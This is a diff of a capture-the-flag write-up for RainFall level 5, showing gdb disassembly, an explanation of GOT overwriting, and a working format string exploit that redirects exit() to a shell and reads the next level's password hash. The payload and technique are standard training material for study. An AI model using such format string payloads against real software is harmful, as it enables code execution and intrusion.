@@ -1,6 +1,6 @@
 # Level 5
 
-- Once logged in, you will see a binary `level5`
+Once logged in, you will see a binary `level5`.
 
 ```
 $ ssh level5@localhost -p 4242
@@ -83,7 +83,6 @@ End of assembler dump.
 
 gdb-peda$ x 0x8049848
 0x8049848 <stdin@@GLIBC_2.0>:	0x00000000
-gdb-peda$ x/s 0x80485f0
 ```
 
 ```
@@ -97,17 +96,13 @@ Dump of assembler code for function o:
    0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
    0x080484bd <+25>:	call   0x8048390 <_exit@plt>
 End of assembler dump.
-gdb-peda$
-
 gdb-peda$ x/s 0x80485f0
 0x80485f0:	 "/bin/sh"
 ```
 
 By decompiling the code, we find that the function `n` is called, but unfortunately the `o` function is never called. In this exploit, we will replace the address of the call to `exit()` with the address of `o`.
 
-We'll accomplish this by filling in the GOT (Global Offset Table) cache before it gets written.
-
-Below is an explanation of GOT from [here](https://www.mattandreko.com/2012/02/02/exploit-exercises-protostar-format-4/):
+We'll accomplish this by filling in the GOT (Global Offset Table) cache before it gets written. Below is an explanation of GOT [from here](https://www.mattandreko.com/2012/02/02/exploit-exercises-protostar-format-4/):
 > When the program runs for the first time, the GOT is initialized to 0x00000000 for every external function, such as libc functions. The first time it runs that function, it will cache the memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. If we overwrite the GOT value, we can make it execute arbitrary code instead of that original function.
 
 The memory address of `exit()` can be acquired by using `objdump`
@@ -130,7 +125,9 @@ OFFSET   TYPE              VALUE
 0804983c R_386_JUMP_SLOT   __libc_start_main
 ```
 
-The only thing left is to overwrite value `0x080484a4` (address of `o`) into `0x08049838` (address of exit) using a format string exploit, the same technique used by last problem.
+So the cache address for `exit` in the GOT is `0x08049838`.
+
+The only thing left is to overwrite the address `0x08049838` (address of exit) with the value `0x080484a4` (address of `o`) using a format string exploit, the same technique used by last problem.
 
 ```
 Python 3.10.4 (v3.10.4:9d38120e33, Mar 23 2022, 17:29:05) [Clang 13.0.0 (clang-1300.0.29.30)] on darwin
@@ -139,14 +136,18 @@ Type "help", "copyright", "credits" or "license" for more information.
 134513828
 ```
 
-`0x80484a4` is `134513828` in decimal, which is the value that needs to be written on `0x08049838`, which is `\x38\x98\x04\x08` in little endian.
-
-Voilà our exploit:
+`0x80484a4` is `134513828` in decimal, which is the value that needs to be written on `0x08049838`, which is `\x38\x98\x04\x08` in little endian. Note that we'll fill in the `134513824` bytes of padding with the same format trick as in the last level. The last thing we need is the offset:
 
 ```
-level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; echo "cat /home/user/level6/.pass") | ./level5
-[...]
-                              200
+level5@RainFall:~$ (python -c 'print "BBBB" + "%x " * 8') | ./level5
+BBBB200 b7fd1ac0 b7ff37d0 42424242 25207825 78252078 20782520 25207825
+```
+
+Armed with our offset of `4` from above, voilà our exploit:
+
+```
+level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%0134513824x%4$n"'; echo "cat /home/user/level6/.pass") | ./level5
+[...]0000000000000000000000000000000000000000000000000000000000000000000000000200
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 level5@RainFall:~$
 ```
